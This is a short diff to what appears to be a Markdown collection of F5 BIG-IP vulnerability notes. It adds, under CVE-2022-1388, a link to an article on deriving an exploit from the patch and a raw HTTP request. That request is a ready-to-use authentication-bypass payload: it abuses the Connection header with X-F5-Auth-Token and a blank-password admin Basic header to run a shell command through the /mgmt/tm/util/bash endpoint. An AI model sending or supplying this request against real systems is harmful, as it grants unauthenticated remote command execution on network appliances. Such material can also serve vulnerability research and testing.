@@ -12,3 +12,15 @@ F5 BIGIP iControl REST CVE-2021-22986
 
 CVE-2022-1388
 + [BIG-IP(CVE-2022-1388)从修复方案分析出exp](https://mp.weixin.qq.com/s/6gVZVRSDRmeGcNYjTldw1Q)
+```
+POST /mgmt/tm/util/bash HTTP/1.1
+Host: 
+Connection: keep-alive, X-F5-Auth-Token
+Authorization: Basic YWRtaW46
+Content-Length: 45
+
+{
+"command":"run",
+"utilCmdArgs":"-c id"
+}
+```
